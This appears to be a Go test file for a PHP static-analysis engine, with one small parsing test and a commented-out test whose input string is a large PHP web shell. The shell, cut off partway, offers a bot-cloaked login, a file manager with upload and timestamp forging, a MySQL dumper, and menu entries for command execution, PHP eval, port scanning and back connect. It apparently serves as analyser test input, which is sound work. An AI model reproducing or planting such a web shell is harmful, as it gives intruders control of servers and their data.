package tests

import (
	"testing"

	test "github.com/yaklang/yaklang/common/yak/ssaapi/test/ssatest"
)

func TestParseSSA_BasicMember(t *testing.T) {
	t.Run("slice normal", func(t *testing.T) {
		test.MockSSA(t, `<?php
function dump($a){}
		$c=[1,2,3];
		dump($c[2]);
		echo 1,2,3,5;
		`)
	})
}

//func TestTest(t *testing.T) {
//	code := "<?php\n@error_reporting(7);\n@session_start();\n@set_time_limit(0);\n@set_magic_quotes_runtime(0);\nif( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {\n    header('HTTP/1.0 404 Not Found');\n    exit;\n}\nob_start();\n$mtime = explode(' ', microtime());\n$starttime = $mtime[1] + $mtime[0];\ndefine('SA_ROOT', str_replace('\\\\', '/', dirname(__FILE__)).'/');\ndefine('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);\ndefine('IS_WIN', DIRECTORY_SEPARATOR == '\\\\');\ndefine('IS_GPC', get_magic_quotes_gpc());\n$dis_func = get_cfg_var('disable_functions');\ndefine('IS_PHPINFO', (!eregi(\"phpinfo\",$dis_func)) ? 1 : 0 );\n\nif( IS_GPC ) {\n    $_POST = s_array($_POST);\n}\n$P = $_POST;\nunset($_POST);\n/*===================== 程序配置 =====================*/\n\n//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认\n// cookie 前缀\n$cookiepre = '';\n// cookie 作用域\n$cookiedomain = '';\n// cookie 作用路径\n$cookiepath = '/';\n// cookie 有效期\n$cookielife = 86400;\n\n/*===================== 配置结束 =====================*/\n\n$charsetdb = array(\n    'big5'\t\t\t=> 'big5',\n    'cp-866'\t\t=> 'cp866',\n    'euc-jp'\t\t=> 'ujis',\n    'euc-kr'\t\t=> 'euckr',\n    'gbk'\t\t\t=> 'gbk',\n    'iso-8859-1'\t=> 'latin1',\n    'koi8-r'\t\t=> 'koi8r',\n    'koi8-u'\t\t=> 'koi8u',\n    'utf-8'\t\t\t=> 'utf8',\n    'windows-1252'\t=> 'latin1',\n);\n\n$act = isset($P['act']) ? $P['act'] : '';\n$charset = isset($P['charset']) ? $P['charset'] : 'gbk';\n$doing = isset($P['doing']) ? $P['doing'] : '';\n\nfor ($i=1;$i<=4;$i++) {\n    ${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';\n}\n\nif (isset($charsetdb[$charset])) {\n    header(\"content-Type: text/html; charset=\".$charset);\n}\n\n$timestamp = time();\n\n/* 身份验证 */\nif ($act == \"logout\") {\n    scookie('loginpass', '', -86400 * 365);\n    @header('Location: '.SELF);\n    exit;\n}\nif($pass) {\n    if ($act == 'login') {\n        if ($pass == encode_pass($P['password'])) {\n            scookie('loginpass',encode_pass($P['password']));\n            @header('Location: '.SELF);\n            exit;\n        }\n    }\n    if (isset($_COOKIE['loginpass'])) {\n        if ($_COOKIE['loginpass'] != $pass) {\n            loginpage();\n        }\n    } else {\n        loginpage();\n    }\n}\n/* 验证结束 */\n\n$errmsg = '';\n$uchar = '&#9650;';\n$dchar = '&#9660;';\n!$act && $act = 'file';\n\n//当前目录/设置工作目录/网站根目录\n$home_cwd = getcwd();\nif (isset($P['cwd']) && $P['cwd']) {\n    chdir($P['cwd']);\n} else {\n    chdir(SA_ROOT);\n}\n$cwd = getcwd();\n$web_cwd = $_SERVER['DOCUMENT_ROOT'];\nforeach (array('web_cwd','cwd','home_cwd') as $k) {\n    if (IS_WIN) {\n        $$k = str_replace('\\\\', '/', $$k);\n    }\n    if (substr($$k, -1) != '/') {\n        $$k = $$k.'/';\n    }\n}\n\n// 查看PHPINFO\nif ($act == 'phpinfo') {\n    if (IS_PHPINFO) {\n        phpinfo();\n        exit;\n    } else {\n        $errmsg = 'phpinfo() function has disabled';\n    }\n}\n\nif(!function_exists('scandir')) {\n    function scandir($cwd) {\n        $files = array();\n        $dh = opendir($cwd);\n        while ($file = readdir($dh)) {\n            $files[] = $file;\n        }\n        return $files ? $files : 0;\n    }\n}\n\nif ($act == 'down') {\n    if (is_file($p1) && is_readable($p1)) {\n        @ob_end_clean();\n        $fileinfo = pathinfo($p1);\n        if (function_exists('mime_content_type')) {\n            $type = @mime_content_type($p1);\n            header(\"Content-Type: \".$type);\n        } else {\n            header('Content-type: application/x-'.$fileinfo['extension']);\n        }\n        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);\n        header('Content-Length: '.sprintf(\"%u\", @filesize($p1)));\n        @readfile($p1);\n        exit;\n    } else {\n        $errmsg = 'Can\\'t read file';\n        $act = 'file';\n    }\n}\n?>\n    <html>\n    <head>\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=<?php echo $charset;?>\">\n        <title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>\n        <style type=\"text/css\">\n            body,td{font: 12px Arial,Tahoma;line-height: 16px;}\n            .input, select{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}\n            .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}\n            .red{color:#f00;}\n            .black{color:#000;}\n            .green{color:#090;}\n            .b{font-weight:bold;}\n            .bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;font:12px Arial,Tahoma;height:22px;}\n            a {color: #00f;text-decoration:none;}\n            a:hover{color: #f00;text-decoration:underline;}\n            .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}\n            .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}\n            .focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffa;padding:5px 15px 5px 5px;}\n            .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}\n            .head td span{font-weight:normal;}\n            .infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}\n            form{margin:0;padding:0;}\n            h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}\n            ul.info li{margin:0;color:#444;line-height:24px;height:24px;}\n            u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}\n            .drives{padding:5px;}\n            .drives span {margin:auto 7px;}\n        </style>\n        <script type=\"text/javascript\">\n            function checkall(form) {\n                for(var i=0;i<form.elements.length;i++) {\n                    var e = form.elements[i];\n                    if (e.type == 'checkbox') {\n                        if (e.name != 'chkall' && e.name != 'saveasfile')\n                            e.checked = form.chkall.checked;\n                    }\n                }\n            }\n            function $(id) {\n                return document.getElementById(id);\n            }\n            function createdir(){\n                var newdirname;\n                newdirname = prompt('Please input the directory name:', '');\n                if (!newdirname) return;\n                g(null,null,'createdir',newdirname);\n            }\n            function fileperm(pfile, val){\n                var newperm;\n                newperm = prompt('Current dir/file:'+pfile+'\\nPlease input new permissions:', val);\n                if (!newperm) return;\n                g(null,null,'fileperm',pfile,newperm);\n            }\n            function rename(oldname){\n                var newfilename;\n                newfilename = prompt('Filename:'+oldname+'\\nPlease input new filename:', '');\n                if (!newfilename) return;\n                g(null,null,'rename',newfilename,oldname);\n            }\n            function createfile(){\n                var filename;\n                filename = prompt('Please input the file name:', '');\n                if (!filename) return;\n                g('editfile', null, null, filename);\n            }\n            function setdb(dbname) {\n                if(!dbname) return;\n                $('dbform').tablename.value='';\n                $('dbform').doing.value='';\n                if ($('dbform').sql_query)\n                {\n                    $('dbform').sql_query.value='';\n                }\n                $('dbform').submit();\n            }\n            function setsort(k) {\n                $('dbform').order.value=k;\n                $('dbform').submit();\n            }\n            function settable(tablename,doing) {\n                if(!tablename) return;\n                if (doing) {\n                    $('dbform').doing.value=doing;\n                } else {\n                    $('dbform').doing.value='';\n                }\n                $('dbform').sql_query.value='';\n                $('dbform').tablename.value=tablename;\n                $('dbform').submit();\n            }\n            function s(act,cwd,p1,p2,p3,p4,charset) {\n                if(act != null) $('opform').act.value=act;\n                if(cwd != null) $('opform').cwd.value=cwd;\n                if(p1 != null) $('opform').p1.value=p1;\n                if(p2 != null) $('opform').p2.value=p2;\n                if(p3 != null) $('opform').p3.value=p3;\n                if(p4 != null) {$('opform').p4.value=p4;}else{$('opform').p4.value='';}\n                if(charset != null) $('opform').charset.value=charset;\n            }\n            function g(act,cwd,p1,p2,p3,p4,charset) {\n                s(act,cwd,p1,p2,p3,p4,charset);\n                $('opform').submit();\n            }\n        </script>\n    </head>\n    <body style=\"margin:0;table-layout:fixed; word-break:break-all\">\n    <?php\n\n    formhead(array('name'=>'opform'));\n    makehide('act', $act);\n    makehide('cwd', $cwd);\n    makehide('p1', $p1);\n    makehide('p2', $p2);\n    makehide('p3', $p3);\n    makehide('p4', $p4);\n    makehide('charset', $charset);\n    formfoot();\n\n    if(!function_exists('posix_getegid')) {\n        $user = @get_current_user();\n        $uid = @getmyuid();\n        $gid = @getmygid();\n        $group = \"?\";\n    } else {\n        $uid = @posix_getpwuid(@posix_geteuid());\n        $gid = @posix_getgrgid(@posix_getegid());\n        $uid = $uid['uid'];\n        $user = $uid['name'];\n        $gid = $gid['gid'];\n        $group = $gid['name'];\n    }\n    ?>\n    <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n        <tr class=\"head\">\n            <td><span style=\"float:right;\"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>\n        </tr>\n        <tr class=\"alt1\">\n            <td>\n\t\t\t<span style=\"float:right;\">Charset:\n                <?php\n                makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'onchange'=>'g(null,null,null,null,null,null,this.value);'));\n                ?>\n\t\t\t</span>\n                <a href=\"javascript:g('logout');\">Logout</a> |\n                <a href=\"javascript:g('file',null,'','','','','<?php echo $charset;?>');\">File Manager</a> |\n                <a href=\"javascript:g('mysqladmin',null,'','','','','<?php echo $charset;?>');\">MYSQL Manager</a> |\n                <a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> |\n                <a href=\"javascript:g('phpenv',null,'','','','','<?php echo $charset;?>');\">PHP Variable</a> |\n                <a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> |\n                <a href=\"javascript:g('secinfo',null,'','','','','<?php echo $charset;?>');\">Security information</a> |\n                <a href=\"javascript:g('eval',null,'','','','','<?php echo $charset;?>');\">Eval PHP Code</a>\n                <?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect',null,'','','','','<?php echo $charset;?>');\">Back Connect</a><?php }?>\n            </td>\n        </tr>\n    </table>\n    <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>\n                <?php\n                $errmsg && m($errmsg);\n\n                if ($act == 'file') {\n\n                    // 判断当前目录可写情况\n                    $dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';\n                    if (isset($p1)) {\n                        switch($p1) {\n                            case 'createdir':\n                                // 创建目录\n                                if ($p2) {\n                                    m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));\n                                }\n                                break;\n                            case 'uploadFile':\n                                // 上传文件\n                                m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));\n                                break;\n                            case 'fileperm':\n                                // 编辑文件属性\n                                if ($p2 && $p3) {\n                                    $p3 = base_convert($p3, 8, 10);\n                                    m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));\n                                }\n                                break;\n                            case 'rename':\n                                // 改名\n                                if ($p2 && $p3) {\n                                    m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));\n                                }\n                                break;\n                            case 'clonetime':\n                                // 克隆时间\n                                if ($p2 && $p3) {\n                                    $time = @filemtime($p3);\n                                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));\n                                }\n                                break;\n                            case 'settime':\n                                // 自定义时间\n                                if ($p2 && $p3) {\n                                    $time = strtotime($p3);\n                                    m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));\n                                }\n                                break;\n                            case 'delete':\n                                // 批量删除文件\n                                if ($P['dl']) {\n                                    $succ = $fail = 0;\n                                    foreach ($P['dl'] as $f) {\n                                        if (is_dir($cwd.$f)) {\n                                            if (@deltree($cwd.$f)) {\n                                                $succ++;\n                                            } else {\n                                                $fail++;\n                                            }\n                                        } else {\n                                            if (@unlink($cwd.$f)) {\n                                                $succ++;\n                                            } else {\n                                                $fail++;\n                                            }\n                                        }\n                                    }\n                                    m('Deleted folder/file(s) have finished, choose '.count($P['dl']).', success '.$succ.', fail '.$fail);\n                                } else {\n                                    m('Please select folder/file(s)');\n                                }\n                                break;\n                            case 'paste':\n                                if($_SESSION['do'] == 'copy') {\n                                    foreach($_SESSION['dl'] as $f) {\n                                        copy_paste($_SESSION['c'],$f, $cwd);\n                                    }\n                                } elseif($_SESSION['do'] == 'move') {\n                                    foreach($_SESSION['dl'] as $f) {\n                                        @rename($_SESSION['c'].$f, $cwd.$f);\n                                    }\n                                }\n                                unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']);\n                                break;\n                            default:\n                                if($p1 == 'copy' || $p1 == 'move') {\n                                    if (isset($P['dl']) && count($P['dl'])) {\n                                        $_SESSION['do'] = $p1;\n                                        $_SESSION['dl'] = $P['dl'];\n                                        $_SESSION['c'] = $P['cwd'];\n                                        m('Have been copied to the session');\n                                    } else {\n                                        m('Please select folder/file(s)');\n                                    }\n                                }\n                                break;\n                        }\n                        echo \"<script type=\\\"text/javascript\\\">$('opform').p1.value='';$('opform').p2.value='';</script>\";\n                    }\n                    //操作完毕\n                    $free = @disk_free_space($cwd);\n                    !$free && $free = 0;\n                    $all = @disk_total_space($cwd);\n                    !$all && $all = 0;\n                    $used = $all-$free;\n                    p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');\n\n                    $cwd_links = '';\n                    $path = explode('/', $cwd);\n                    $n=count($path);\n                    for($i=0;$i<$n-1;$i++) {\n                        $cwd_links .= '<a href=\"javascript:g(\\'file\\', \\'';\n                        for($j=0;$j<=$i;$j++) {\n                            $cwd_links .= $path[$j].'/';\n                        }\n                        $cwd_links .= '\\');\">'.$path[$i].'/</a>';\n                    }\n\n                    ?>\n                    <script type=\"text/javascript\">\n                        document.onclick = shownav;\n                        function shownav(e){\n                            var src = e?e.target:event.srcElement;\n                            do{\n                                if(src.id ==\"jumpto\") {\n                                    $('inputnav').style.display = \"\";\n                                    $('pathnav').style.display = \"none\";\n                                    return;\n                                }\n                                if(src.id ==\"inputnav\") {\n                                    return;\n                                }\n                                src = src.parentNode;\n                            }while(src.parentNode)\n\n                            $('inputnav').style.display = \"none\";\n                            $('pathnav').style.display = \"\";\n                        }\n                    </script>\n                    <div style=\"background:#eee;margin-bottom:10px;\">\n                        <form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">\n                            <table id=\"pathnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\">\n                                <tr>\n                                    <td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?> (<?php echo $dir_writeable;?>)</td>\n                                    <td nowrap><input class=\"bt\" id=\"jumpto\" name=\"jumpto\" value=\"Jump to\" type=\"button\"></td>\n                                </tr>\n                            </table>\n                            <table id=\"inputnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\" style=\"display:none;\">\n                                <tr>\n                                    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($cwd);?>)</td>\n                                    <td width=\"100%\"><input class=\"input\" name=\"cwd\" value=\"<?php echo $cwd;?>\" type=\"text\" style=\"width:99%;margin:0 8px;\"></td>\n                                    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"></td>\n                                </tr>\n                            </table>\n                        </form>\n                        <?php\n                        if (IS_WIN) {\n                            $comma = '';\n                            p('<div class=\"drives\">');\n                            foreach( range('A','Z') as $drive ) {\n                                if (is_dir($drive.':/')) {\n                                    p($comma.'<a href=\"javascript:g(\\'file\\', \\''.$drive.':/\\');\">'.$drive.':\\</a>');\n                                    $comma = '<span>|</span>';\n                                }\n                            }\n                            p('</div>');\n                        }\n                        ?>\n                    </div>\n                    <?php\n                    p('<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">');\n                    p('<tr class=\"alt1\"><td colspan=\"6\" style=\"padding:5px;line-height:20px;\">');\n                    p('<form action=\"'.SELF.'\" method=\"POST\" enctype=\"multipart/form-data\"><div style=\"float:right;\"><input name=\"uploadfile\" value=\"\" type=\"file\" /> <input class=\"bt\" value=\"Upload\" type=\"submit\" /><input name=\"charset\" value=\"'.$charset.'\" type=\"hidden\" /><input type=\"hidden\" name=\"p1\" value=\"uploadFile\"><input name=\"cwd\" value=\"'.$cwd.'\" type=\"hidden\" /></div></form>');\n                    p('<a href=\"javascript:g(\\'file\\', \\''.str_replace('\\\\','/',$web_cwd).'\\');\">WebRoot</a>');\n                    p(' | <a href=\"javascript:g(\\'file\\', \\''.$home_cwd.'\\');\">ScriptPath</a>');\n                    p(' | <a href=\"javascript:g(\\'file\\',\\''.$cwd.'\\',null,null,null,\\'dir\\');\">View Writable Directory</a> ');\n                    p(' | <a href=\"javascript:createdir();\">Create Directory</a> | <a href=\"javascript:createfile();\">Create File</a>');\n                    p('</td></tr>');\n\n                    $sort = array('filename', 1);\n                    if($p1) {\n                        if(preg_match('!s_([A-z_]+)_(\\d{1})!', $p1, $match)) {\n                            $sort = array($match[1], (int)$match[2]);\n                        }\n                    }\n\n                    formhead(array('name'=>'flist'));\n                    makehide('act','file');\n                    makehide('p1','');\n                    makehide('cwd',$cwd);\n                    makehide('charset',$charset);\n                    p('<tr class=\"head\">');\n                    p('<td width=\"2%\" nowrap><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"checkall(this.form)\" /></td>');\n                    p('<td><a href=\"javascript:g(\\'file\\',null,\\'s_filename_'.($sort[1]?0:1).'\\');\">Filename</a> '.($p1 == 's_filename_0' ? $dchar : '').($p1 == 's_filename_1' || !$p1 ? $uchar : '').'</td>');\n                    p('<td width=\"16%\"><a href=\"javascript:g(\\'file\\',null,\\'s_mtime_'.($sort[1]?0:1).'\\');\">Last modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');\n                    p('<td width=\"10%\"><a href=\"javascript:g(\\'file\\',null,\\'s_size_'.($sort[1]?0:1).'\\');\">Size</a> '.($p1 == 's_size_0' ? $dchar : '').($p1 == 's_size_1' ? $uchar : '').'</td>');\n                    p('<td width=\"20%\">Chmod / Perms</td>');\n                    p('<td width=\"22%\">Action</td>');\n                    p('</tr>');\n\n                    //查看所有可写文件和目录\n                    $dirdata=$filedata=array();\n\n                    if ($p4 == 'dir') {\n                        $dirdata = GetWDirList($cwd);\n                        $filedata = array();\n                    } else {\n                        // 默认目录列表\n                        $dirs = @scandir($cwd);\n                        if ($dirs) {\n                            $dirs = array_diff($dirs, array('.'));\n                            foreach ($dirs as $file) {\n                                $filepath=$cwd.$file;\n                                if(@is_dir($filepath)){\n                                    $dirdb['filename']=$file;\n                                    $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n                                    $dirdb['chmod']=getChmod($filepath);\n                                    $dirdb['perm']=PermsColor($filepath);\n                                    $dirdb['owner']=getUser($filepath);\n                                    $dirdb['link']=$filepath;\n                                    if ($file=='..') {\n                                        $dirdata['up']=1;\n                                    } else {\n                                        $dirdata[]=$dirdb;\n                                    }\n                                } else {\n                                    $filedb['filename']=$file;\n                                    //$filedb['size']=@filesize($filepath);\n                                    $filedb['size']=sprintf(\"%u\", @filesize($filepath));\n                                    $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n                                    $filedb['chmod']=getChmod($filepath);\n                                    $filedb['perm']=PermsColor($filepath);\n                                    $filedb['owner']=getUser($filepath);\n                                    $filedb['link']=$filepath;\n                                    $filedata[]=$filedb;\n                                }\n                            }\n                            unset($dirdb);\n                            unset($filedb);\n                        }\n                    }\n                    $dir_i = '0';\n                    if (isset($dirdata['up'])) {\n                        $thisbg = bg();\n                        p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n                        p('<td align=\"center\">-</td><td nowrap colspan=\"5\"><a href=\"javascript:g(\\'file\\',\\''.getUpPath($cwd).'\\');\">Parent Directory</a></td>');\n                        p('</tr>');\n                    }\n                    unset($dirdata['up']);\n                    usort($dirdata, 'cmp');\n                    usort($filedata, 'cmp');\n                    foreach($dirdata as $key => $dirdb){\n                        if($p1 == 'getsize' && $p2 == $dirdb['filename']) {\n                            $attachsize = dirsize($p2);\n                            $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';\n                        } else {\n                            $attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';\n                        }\n                        $thisbg = bg();\n                        p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n                        p('<td width=\"2%\" nowrap><input name=\"dl[]\" type=\"checkbox\" value=\"'.$dirdb['filename'].'\"></td>');\n                        p('<td><a href=\"javascript:g(\\'file\\',\\''.$dirdb['link'].'\\')\">'.$dirdb['filename'].'</a></td>');\n                        p('<td nowrap><a href=\"javascript:g(\\'newtime\\',null,\\''.$dirdb['filename'].'\\');\">'.$dirdb['mtime'].'</a></td>');\n                        p('<td nowrap>'.$attachsize.'</td>');\n                        p('<td nowrap>');\n                        p('<a href=\"javascript:fileperm(\\''.$dirdb['filename'].'\\', \\''.$dirdb['chmod'].'\\');\">'.$dirdb['chmod'].'</a> / ');\n                        p('<a href=\"javascript:fileperm(\\''.$dirdb['filename'].'\\', \\''.$dirdb['chmod'].'\\');\">'.$dirdb['perm'].'</a>'.$dirdb['owner'].'</td>');\n                        p('<td nowrap><a href=\"javascript:rename(\\''.$dirdb['filename'].'\\');\">Rename</a></td>');\n                        p('</tr>');\n                        $dir_i++;\n                    }\n\n                    p('<tr bgcolor=\"#dddddd\" stlye=\"border-top:1px solid #fff;border-bottom:1px solid #ddd;\"><td colspan=\"6\" height=\"5\"></td></tr>');\n                    $file_i = '0';\n\n                    foreach($filedata as $key => $filedb){\n                        $fileurl = '/'.str_replace($web_cwd,'',$filedb['link']);\n                        $thisbg = bg();\n                        p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n                        p('<td width=\"2%\" nowrap><input name=\"dl[]\" type=\"checkbox\" value=\"'.$filedb['filename'].'\"></td>');\n                        p('<td>'.((strpos($filedb['link'], $web_cwd) !== false) ? '<a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');\n                        p('<td nowrap><a href=\"javascript:g(\\'newtime\\',null,\\''.$filedb['filename'].'\\');\">'.$filedb['mtime'].'</a></td>');\n                        p('<td nowrap>'.sizecount($filedb['size']).'</td>');\n                        p('<td nowrap>');\n                        p('<a href=\"javascript:fileperm(\\''.$filedb['filename'].'\\', \\''.$filedb['chmod'].'\\');\">'.$filedb['chmod'].'</a> / ');\n                        p('<a href=\"javascript:fileperm(\\''.$filedb['filename'].'\\', \\''.$filedb['chmod'].'\\');\">'.$filedb['perm'].'</a>'.$filedb['owner'].'</td>');\n                        p('<td nowrap>');\n                        p('<a href=\"javascript:g(\\'down\\',null,\\''.$filedb['filename'].'\\');\">Down</a> | ');\n                        p('<a href=\"javascript:g(\\'editfile\\',null,null,\\''.$filedb['filename'].'\\');\">Edit</a> | ');\n                        p('<a href=\"javascript:rename(\\''.$filedb['filename'].'\\');\">Rename</a>');\n                        p('</td></tr>');\n                        $file_i++;\n                    }\n                    p('<tr class=\"'.bg().' head\"><td colspan=\"5\"><a href=\"#\" onclick=\"$(\\'flist\\').p1.value=\\'delete\\';$(\\'flist\\').submit();\">Delete</a> | <a href=\"#\" onclick=\"$(\\'flist\\').p1.value=\\'copy\\';$(\\'flist\\').submit();\">Copy</a> | <a href=\"#\" onclick=\"$(\\'flist\\').p1.value=\\'move\\';$(\\'flist\\').submit();\">Move</a>'.(isset($_SESSION['do']) && @count($_SESSION['dl']) ? ' | <a href=\"#\" onclick=\"$(\\'flist\\').p1.value=\\'paste\\';$(\\'flist\\').submit();\">Paste</a>' : '').'</td><td align=\"right\">'.$dir_i.' directories / '.$file_i.' files</td></tr>');\n                    p('</form></table>');\n                }// end dir\n\n                elseif ($act == 'mysqladmin') {\n                    $order = isset($P['order']) ? $P['order'] : '';\n                    $dbhost = isset($P['dbhost']) ? $P['dbhost'] : '';\n                    $dbuser = isset($P['dbuser']) ? $P['dbuser'] : '';\n                    $dbpass = isset($P['dbpass']) ? $P['dbpass'] : '';\n                    $dbname = isset($P['dbname']) ? $P['dbname'] : '';\n                    $tablename = isset($P['tablename']) ? $P['tablename'] : '';\n\n                    if ($doing == 'dump') {\n                        if (isset($P['bak_table']) && $P['bak_table']) {\n                            $DB = new DB_MySQL;\n                            $DB->charsetdb = $charsetdb;\n                            $DB->charset = $charset;\n                            $DB->connect($dbhost, $dbuser, $dbpass, $dbname);\n                            if ($P['saveasfile'] && $P['bak_path']) {\n                                $fp = @fopen($P['bak_path'],'w');\n                                if ($fp) {\n                                    foreach($P['bak_table'] as $k => $v) {\n                                        if ($v) {\n                                            $DB->sqldump($v, $fp);\n                                        }\n                                    }\n                                    fclose($fp);\n                                    $fileurl = str_replace(SA_ROOT,'',$P['bak_path']);\n                                    m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');\n                                } else {\n                                    m('Backup failed');\n                                }\n                            } else {\n                                @ob_end_clean();\n                                $filename = basename($dbname.'.sql');\n                                header('Content-type: application/unknown');\n                                header('Content-Disposition: attachment; filename='.$filename);\n                                foreach($P['bak_table'] as $k => $v) {\n                                    if ($v) {\n                                        $DB->sqldump($v);\n                                    }\n                                }\n                                exit;\n                            }\n                            $DB->close();\n                        } else {\n                            m('Please choose the table');\n                        }\n                        $doing = '';\n                    }\n\n                    formhead(array('title'=>'MYSQL Manager', 'name'=>'dbform'));\n                    makehide('act','mysqladmin');\n                    makehide('doing',$doing);\n                    makehide('charset', $charset);\n                    makehide('tablename', $tablename);\n                    makehide('order', $order);\n                    p('<p>');\n                    p('DBHost:');\n                    makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));\n                    p('DBUser:');\n                    makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));\n                    p('DBPass:');\n                    makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));\n                    makeinput(array('value'=>'Connect','type'=>'submit','class'=>'bt'));\n                    p('</p>');\n\n                    if ($dbhost && $dbuser && isset($dbpass)) {\n\n                        // 初始化数据库类\n                        $DB = new DB_MySQL;\n                        $DB->charsetdb = $charsetdb;\n                        $DB->charset = $charset;\n                        $DB->connect($dbhost, $dbuser, $dbpass, $dbname);\n\n                        //获取数据库信息\n                        p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');\n                        $highver = $DB->version() > '4.1' ? 1 : 0;\n\n                        //获取数据库\n                        $query = $DB->query(\"SHOW DATABASES\");\n                        $dbs = array();\n                        $dbs[] = '-- Select a database --';\n                        while($db = $DB->fetch($query)) {\n                            $dbs[$db['Database']] = $db['Database'];\n                        }\n                        makeselect(array('name'=>'dbname','option'=>$dbs,'selected'=>$dbname,'onchange'=>'setdb(this.options[this.selectedIndex].value)'));\n\n                        if ($dbname) {\n                            p('<p>Current dababase: <a href=\"javascript:setdb(\\''.$dbname.'\\');\">'.$dbname.'</a>');\n                            if ($tablename) {\n                                p(' | Current Table: <a href=\"javascript:settable(\\''.$tablename.'\\');\">'.$tablename.'</a> [ <a href=\"javascript:settable(\\''.$tablename.'\\', \\'structure\\');\">Structure</a> ]');\n                            }\n                            p('</p>');\n\n                            $sql_query = isset($P['sql_query']) ? $P['sql_query'] : '';\n\n                            if ($tablename && !$sql_query) {\n                                $sql_query = \"SELECT * FROM $tablename LIMIT 0, 30\";\n                            }\n                            if ($tablename && $doing == 'structure') {\n                                $sql_query = \"SHOW FULL COLUMNS FROM $tablename;\\n\";\n                                $sql_query .= \"SHOW INDEX FROM $tablename;\";\n                            }\n                            p('<p><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name=\"sql_query\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" onclick=\"$(\\'doing\\').value=\\'\\'\" style=\"height:50px;\" type=\"submit\" value=\"Query\" /></td></tr></table></p>');\n                            if ($sql_query) {\n                                $querys = @explode(';',$sql_query);\n                                foreach($querys as $num=>$query) {\n                                    if ($query) {\n                                        p(\"<p class=\\\"red b\\\">Query#{$num} : \".htmlspecialchars($query,ENT_QUOTES).\"</p>\");\n                                        switch($DB->query_res($query))\n                                        {\n                                            case 